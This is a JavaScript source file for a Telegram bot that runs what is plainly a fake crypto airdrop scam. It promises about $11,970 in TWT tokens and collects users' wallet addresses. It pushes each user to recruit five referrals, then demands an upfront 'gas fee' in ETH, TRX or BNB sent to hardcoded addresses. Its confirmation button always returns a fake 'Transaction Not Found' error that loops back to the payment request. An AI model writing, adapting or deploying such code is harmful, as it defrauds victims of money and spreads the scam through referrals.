const client = require("./redisConfig");
const fs = require('fs');
const FormData = require('form-data');



async function startFuntion(chat){
     try {
                
        let caption;
        let keyboard;
        let keyboardJSON;
        const formData = new FormData();

        keyboard = [
            [{ text: 'Join Airdrop', callback_data: '/JoinGroup' }]
          ]

        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });

        

        caption = "Hello "+`${chat?.first_name}`+", I am your friendly TWT  Airdrop bot\n"+
        "\n"+
        "🔹 Earn 9,000 TWT (~$11,970) For Completing Tasks\n"+
        "🔹 Earn 100 TWT (~$133) For Each Refer\n"+
        "\n"+
        "📢 Airdrop Rules\n"+
        "\n"+
        "🔸 follow Our Twitter handle\n"+
        "🔹 follow Our Instagram handle\n"+
        "🔸 Join Our Telegram Group\n"+
        "🔹 Join Our Telegram Channel\n";
        "🔸 Refer at least 5 Friends\n"+
        "\n"+
        "Click On  '✅ Join Airdrop' For Procced";
        
        formData.append('chat_id', chat?.id);
        formData.append('photo', fs.createReadStream('./download.png'));
        formData.append('caption', caption);
        formData.append('reply_markup', keyboardJSON);


        return {
          formData,
          urlType: `sendPhoto`
        }


     } catch (err) {
        console.log(err);
     }
}



async function JoinGroupFunction(chat){
    try {

        let caption;
        let keyboard;
        let keyboardJSON;
        const formData = new FormData();


        caption =     "Let's proceed:\n"+
                     "🔸 follow Our Twitter handle\n"+
                     "🔹 follow Our Instagram handle\n"+
                     "🔸 Join Our Telegram Group\n"+
                     "🔹 Join Our Telegram Channel\n";
      keyboard = [
      [{ text: 'check ✅', callback_data: '/submit' }]
    ]

      keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });

        formData.append('chat_id', chat?.id);
        formData.append('photo', fs.createReadStream('./image2.jpeg'));
        formData.append('caption', caption);
        formData.append('reply_markup', keyboardJSON);

        return {
          formData,
          urlType: `sendPhoto`
        }
    } catch (err) {
        console.log(err);
    }
}


async function submitWallet(chat){
    try {

        let caption;
        let messageJSON;
        const formData = new FormData();

    
            caption = "⬇️ Now Please Submit Your TWT ERC20 Wallet Address\n"+ 
            "Search 'TWT' in Trust wallet or Safepal , Copy receive address and paste it Here\n\n"+
            "Ensure to put address using format ⬇️\n\n"+
            "wallet :- fhejheiuriru2o824230weuwieu87 \n\n"+
            "Add the text 'wallet' in other for our server to read your address";

            formData.append('chat_id', chat?.id);
            formData.append('photo', fs.createReadStream('./image5.jpeg'));
            formData.append('caption', caption);
            
                     
            return  {
            formData,
            urlType: `sendPhoto`
            }

    } catch (err) {
        console.log(err);
    }
}

async function submitWalletComplete(chat){


                let caption;
                let keyboard;
                let keyboardJSON;
                const formData = new FormData();

                keyboard = [
                [{ text: 'Withdraw Token', callback_data: '/Withdraw' }]
                ]

                keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });

 
        caption = "🎉 Congratulations "+`${chat?.first_name}\n`+
                "9,000 $TWT equivalent to (~$11,970) will be send to your wallet. \n"+
                "Share the your Referral link to others and get 100 $TWT (~$133) for Each Refer \n"+
                "‼️You need at least 👥 5 referrals to withdraw your Tokens. \n"+
                "Share your Referral link: \n"+
                "https://t.me/tegaOnyoh_bot";
        
       formData.append('chat_id', chat?.id);
       formData.append('photo', fs.createReadStream('./image3.jpg'));  
       formData.append('caption', caption);
       formData.append('reply_markup', keyboardJSON);


                return {
                   formData,
                    urlType: `sendPhoto`
                }

}

async function withdrawFunction(chat){
    try {
        let caption;
       
        let keyboard;
        let keyboardJSON;
        const formData = new FormData();


            caption = "Attention ❗️\n"+
                       "\n"+
                       "💎 You Need Send $27 (0.05 BNB or 230 TRX or 0.009 ETH) as Gas Fee for Withdraw your TWT Tokens.\n"+
                       "💸 This Gas fee is Needed for Transfer your TWT Tokens Because Transfer fee in Ethereum (ERC20) Network is So High.\n"+
                       "\n"+
                       "💳 Chose Payment methods From Below Buttons 👇:\n"
            
        keyboard = [
        [{ text: '🔸 BNB', callback_data: '/bnb' }],
        [{ text: '🔺 TRX', callback_data: '/trx' }],
        [{ text: '🔹 ETH', callback_data: '/eth' }]
        ]

        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });


            formData.append('chat_id', chat?.id);
            formData.append('photo', fs.createReadStream('./image4.jpeg'));
            formData.append('caption', caption);
            formData.append('reply_markup', keyboardJSON);
            
          
            return  {
            formData,
            urlType: `sendPhoto`
            }

    } catch (err) {
        console.log(err)
    }
}


async function ethGasFee(chat){
    try {
        const text = " 📝 Please Send 0.009 ETH as Ethereum (ERC20) network fee for withdraw your TWT Tokens.\n\n"+
                     "Address :- 0x1Eebc95ac5945C467a9c73Aa0b527137983595fE \n\n"+
                     "Send: 0.009 ETH \n\n"+
                    "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                     "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";

                     keyboard = [
                        [{ text: 'check ✅', callback_data: '/error' }]
                      ]
                  
                        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
                
                return {
                    chat_id: chat?.id,
                    text,
                    reply_markup: keyboardJSON,
                    urlType: `sendMessage`
                }

    } catch (err) {
        console.log(err);
    }
}


async function trxGasFee(chat){
    try {


        const text = " 📝 Please Send 230 TRX as Tron (TRC20) network fee for withdraw your TWT Tokens.\n\n"+
                     "Address :-TPFDpdFrMndJD8ZwhKC9joZ22pGyCgPzvJ \n\n"+
                     "Send: 230 TRX \n\n"+
                    "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                     "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";

                     keyboard = [
                        [{ text: 'check ✅', callback_data: '/error' }]
                      ]
                  
                        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
                
                return {
                    chat_id: chat?.id,
                    text: text,
                    reply_markup: keyboardJSON,
                    urlType: `sendMessage`
                }

    } catch (err) {
        console.log(err);
    }
}

async function bnbGasFee(chat){
    try {


        const text = " 📝 Please Send 0.05 BNB Smart Chain as BNB (BEP20) network fee for withdraw your TWT Tokens. \n\n"+
                     "Address :- bnb1e3tpnrmlft3eaqdrg9kalwwtq93a8p45r350a3 \n\n"+
                     "Send: 0.05 TRX \n\n"+
                    "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                     "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";

                     keyboard = [
                        [{ text: 'check ✅', callback_data: '/error' }]
                      ]
                  
                        keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
                
                return {
                    chat_id: chat?.id,
                    text,
                    reply_markup: keyboardJSON,
                    urlType: `sendMessage`
                }

    } catch (err) {
        console.log(err);
    }
}

async function errorMessage(chat){
    try {
        const text = "❌ Your Transaction Not Found !\n"+
                      "it's Seems you're trying Confirm\n"+
                      "Transaction without paying Gas fee... Please Pay the Gas fee and Try Again";
               
        const  keyboard = [
            [{ text: 'Retry', callback_data: '/Withdraw' }]
            ]
        
            const  keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
          
            return {
                chat_id: chat?.id,
                text,
                reply_markup: keyboardJSON,
                urlType: `sendMessage`
            }

    } catch (err) {
        console.log(err);
    }
}


module.exports = {startFuntion, JoinGroupFunction, submitWallet, submitWalletComplete, withdrawFunction, ethGasFee, trxGasFee, bnbGasFee, errorMessage};



